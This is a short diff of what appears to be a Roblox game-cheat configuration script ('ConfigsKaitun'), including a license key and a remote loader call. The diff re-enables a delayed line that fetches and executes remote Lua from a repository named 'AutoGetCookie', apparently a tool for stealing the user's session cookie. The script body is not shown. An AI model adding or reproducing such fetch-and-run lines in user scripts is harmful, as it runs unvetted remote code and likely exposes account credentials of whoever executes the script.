@@ -191,5 +191,5 @@ getgenv().ConfigsKaitun = {
 License = "qTtCbAWlIJxw3Lp2g9gMvZomk9BuHAju"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
--- wait(60)
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
+wait(60)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
